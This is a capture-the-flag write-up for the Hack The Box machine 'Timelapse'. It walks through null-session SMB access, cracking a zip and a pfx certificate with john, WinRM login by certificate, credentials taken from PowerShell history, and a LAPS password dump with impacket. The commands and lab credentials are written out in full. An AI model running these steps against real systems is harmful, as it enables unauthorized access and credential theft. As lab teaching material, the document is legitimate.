#box #zip2john #john-the-ripper #pfx2john #certipy #impacket-GetLAPSPassword
## Nmap

```bash
# Nmap 7.95 scan initiated Sun Sep 21 13:03:32 2025 as: /usr/lib/nmap/nmap -sCV --min-rate=10000 -o nmap_sCV 10.10.11.152
Nmap scan report for 10.10.11.152
Host is up (0.037s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-09-22 00:49:17Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
5986/tcp open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_ssl-date: 2025-09-22T00:50:47+00:00; +7h45m47s from scanner time.
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=9/21%Time=68D02FF9%P=x86_64-pc-linux-gnu%r(DNS-
SF:SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
SF:_udp\x05local\0\0\x0c\0\x01");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-22T00:50:03
|_  start_date: N/A
|_clock-skew: mean: 7h45m45s, deviation: 2s, median: 7h45m43s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 21 13:05:00 2025 -- 1 IP address (1 host up) scanned in 88.33 seconds
```
## 445 - SMB

SMB permits us to scan the available shares with the null session:

```bash
smbclient -N -L //timelapse.htb/
```

However, NOT ALL shares are available to access with the Null user. The only one which we can access is the share `Shares`.
Inside of it, we discover `zip` file. We download it on our machine:

```bash
smbclient -N //timelapse.htb/Shares -c 'cd Dev;get winrm_backup.zip'
```

### Cracking the zip

When accessed, the zip file asks for a password. We try to crack it with `john`, but first of all we must convert the zip file into a john-readable hash:

```bash
zip2john winrm_backup.zip > zip.hash
```

We then crack it:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

We obtain the password: `supremelegacy`.
We can now unzip the file and it'll return us a `pfx` certificate.

>At this point I was pretty lost since I didn't know the `pfx` certificate could be password protected itself. In fact, any attempt at using `certipy-ad` wasn't succeeding because the file was password protected

### Cracking the Certificate (.pfx)
#john-the-ripper #zip2john #pfx2john

We iterate the same process above, this time for the pfx file:

```bash
pfx2john legacyy_dev_auth.pfx
```

and then crack it:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash
```

Obtaining the password of the `pfx` file: `thuglegacy`.

### Generating the public and private keys
#certipy

Now, with the help of `certipy-ad` we can generate the public and private keys for the user. First of all, we can "decrypt" the pfx file, with `certipy-ad` to prevent adding the password each time:

```bash
certipy-ad cert -export -pfx "legacyy_dev_auth.pfx" -password "thuglegacy" -out "unprotected.pfx"
```

Then we can generate the two keys (only the `nocert` and `nokey` flag changes):

```bash
certipy-ad cert -pfx "unprotected.pfx" -nocert -out "user.key"
```

```bash
certipy-ad cert -pfx "unprotected.pfx" -nokey -out "user.crt"
```

### Authenticating with `evil-winrm` and the pair of keys

From here, we can finally authenticate to the target machine with `evil-winrm` by passing the two keys (similar to the SSH authentication):

```bash
evil-winrm -i 10.10.11.152 -c user.crt -k user.key -S -r TIMELAPSE.HTB # -S stands for SSL
```

## Privilege Escalation
#PowerShell #history #credentials #LAPS

Once on the target machine, we realize that we download from the share files containing `LAPS` in it. LAPS stands for Local Administrator Password Solution and permits to randomize password on different PCs of a domain as the Administrator. This way the user can remember / save a single password for DC while the password for the other PCs are secretly stored in the LAPS.
We try to read the content of it but unfortunately we're unable to. Moreover, we cannot even load Modules on PowerShell because a policy is restricting us from doing so.
After looking around we look for the Powershell history file stored in: `$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`. 
We print the file and discover some commands specifying an username and a password:

![[attachments/timelapse-writeup-1.png]]

Obtaining a new pair of credentials: `svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV`
We opt to authenticate again with `evil-winrm`, this time with the other user (do not forget `-S` since WinRM is on port 5986 SSL):

```bash
evil-winrm -u svc_deploy -i timelapse.htb -S
```

Succeeding, and reaching the new foothold.

### LAPS Dump

Inside the new user, we look at the groups we belong to, discovering we belong to a peculiar group called `TIMELAPSE\LAPS_Readers`:

![[attachments/timelapse-writeup-2.png]]

We opt now to try reading the LAPS `AdmPwd.dll` dump from our Linux machine with `impacket-GetLAPSPassword`:

```bash
impacket-GetLAPSPassword timelapse.htb/svc_deploy:'E3R$Q62^12p7PLlC%KWaxuaV' -dc-ip 10.10.11.152
```

Obtaining the password of the Administrator: `Administrator:gs6h{#6I7N+(i524;t)#vUSR`

![[attachments/timelapse-writeup-3.png]]

We can now authenticate as the Administrator and get the final flag.

>Alternatively, we could extract the LAPS password with `ldapsearch`
>![[attachments/timelapse-writeup-4.png]]

